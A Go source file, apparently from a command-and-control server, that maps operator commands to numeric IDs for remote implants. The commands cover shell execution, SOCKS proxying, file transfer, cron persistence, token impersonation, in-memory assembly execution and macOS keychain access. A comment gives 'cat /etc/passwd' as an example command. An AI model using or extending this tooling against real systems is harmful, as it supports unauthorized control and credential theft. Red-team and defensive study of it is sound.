// Package commands provides command ID mappings for the C2 server.
// This is the single source of truth for command name to numeric ID translation.
//
// To add a new command:
// 1. Pick an ID from the appropriate range (see below)
// 2. Add a constant (e.g., CmdNewThing = 19)
// 3. Add to NameToID map (e.g., "new-thing": CmdNewThing)
// 4. Update the payload's cmd_ids.go with the same constant
//
// ID Ranges:
//   1-99:    Cross-platform commands (Linux, Darwin, Windows)
//   100-199: Linux/Darwin specific
//   200-299: Windows specific
//   300-399: Darwin only
package commands

import "strings"

// Command IDs - Cross-platform (1-99)
const (
	CmdCd       = 1
	CmdLs       = 2
	CmdPwd      = 3
	CmdDownload = 4
	CmdUpload   = 5
	CmdShell    = 6
	CmdSocks    = 7
	CmdJobkill  = 8
	CmdExit     = 9
	CmdSleep    = 10
	CmdRekey    = 11
	CmdEnv      = 12
	CmdCat      = 13
	CmdHash     = 14
	CmdHashDir  = 15
	CmdPs       = 16
	CmdRm       = 17
	CmdWhoami   = 18
)

// Command IDs - Linux/Darwin specific (100-199)
const (
	CmdSudoSession = 100
	CmdPersist     = 101
	CmdPersistCron = 102
)

// Command IDs - Windows specific (200-299)
const (
	CmdToken                   = 200
	CmdRev2self                = 201
	CmdBof                     = 210
	CmdBofAsync                = 211
	CmdBofJobs                 = 212
	CmdBofOutput               = 213
	CmdBofKill                 = 214
	CmdInlineAssembly          = 220
	CmdInlineAssemblyAsync     = 221
	CmdInlineAssemblyJobs      = 222
	CmdInlineAssemblyOutput    = 223
	CmdInlineAssemblyKill      = 224
	CmdInlineAssemblyJobsClean = 225
	CmdInlineAssemblyJobsStats = 226
	CmdLink                    = 230
	CmdUnlink                  = 231
	CmdLinks                   = 232
)

// Command IDs - Darwin only (300-399)
const (
	CmdKeychain = 300
)

// CmdUnknown indicates an unrecognized command (will be treated as shell)
const CmdUnknown = -1

// NameToID maps command name strings to numeric IDs.
// The server uses this to translate user commands before sending to payloads.
var NameToID = map[string]int{
	// Cross-platform
	"cd":       CmdCd,
	"ls":       CmdLs,
	"pwd":      CmdPwd,
	"download": CmdDownload,
	"upload":   CmdUpload,
	"shell":    CmdShell,
	"socks":    CmdSocks,
	"jobkill":  CmdJobkill,
	"exit":     CmdExit,
	"sleep":    CmdSleep,
	"rekey":    CmdRekey,
	"env":      CmdEnv,
	"cat":      CmdCat,
	"hash":     CmdHash,
	"hash-dir": CmdHashDir,
	"ps":       CmdPs,
	"rm":       CmdRm,
	"whoami":   CmdWhoami,

	// Linux/Darwin
	"sudo-session": CmdSudoSession,
	"persist":      CmdPersist,
	"persist-cron": CmdPersistCron,

	// Windows
	"token":                     CmdToken,
	"rev2self":                  CmdRev2self,
	"bof":                       CmdBof,
	"bof-async":                 CmdBofAsync,
	"bof-jobs":                  CmdBofJobs,
	"bof-output":                CmdBofOutput,
	"bof-kill":                  CmdBofKill,
	"inline-assembly":           CmdInlineAssembly,
	"inline-assembly-async":     CmdInlineAssemblyAsync,
	"inline-assembly-jobs":      CmdInlineAssemblyJobs,
	"inline-assembly-output":    CmdInlineAssemblyOutput,
	"inline-assembly-kill":      CmdInlineAssemblyKill,
	"inline-assembly-jobs-clean": CmdInlineAssemblyJobsClean,
	"inline-assembly-jobs-stats": CmdInlineAssemblyJobsStats,
	"link":                      CmdLink,
	"unlink":                    CmdUnlink,
	"links":                     CmdLinks,

	// Darwin only
	"keychain": CmdKeychain,
}

// IDToName provides reverse lookup (for logging/debugging on server side)
var IDToName = func() map[int]string {
	m := make(map[int]string, len(NameToID))
	for name, id := range NameToID {
		m[id] = name
	}
	return m
}()

// GetCommandID extracts the command name from a command string and returns its numeric ID.
// Returns CmdUnknown (-1) if the command is not recognized (will be treated as shell command).
func GetCommandID(commandStr string) int {
	commandStr = strings.TrimSpace(commandStr)
	if commandStr == "" {
		return CmdUnknown
	}

	// Extract the first word as the command name
	fields := strings.Fields(commandStr)
	if len(fields) == 0 {
		return CmdUnknown
	}

	cmdName := strings.ToLower(fields[0])
	if id, ok := NameToID[cmdName]; ok {
		return id
	}

	return CmdUnknown
}

// GetCommandName returns the command name for a given ID (for logging).
// Returns empty string if ID is not recognized.
func GetCommandName(id int) string {
	if name, ok := IDToName[id]; ok {
		return name
	}
	return ""
}

// GetCommandArgs extracts the arguments portion from a command string.
// e.g., "cat /etc/passwd" returns "/etc/passwd"
func GetCommandArgs(commandStr string) string {
	commandStr = strings.TrimSpace(commandStr)
	fields := strings.Fields(commandStr)
	if len(fields) <= 1 {
		return ""
	}
	// Rejoin everything after the command name
	return strings.TrimSpace(commandStr[len(fields[0]):])
}
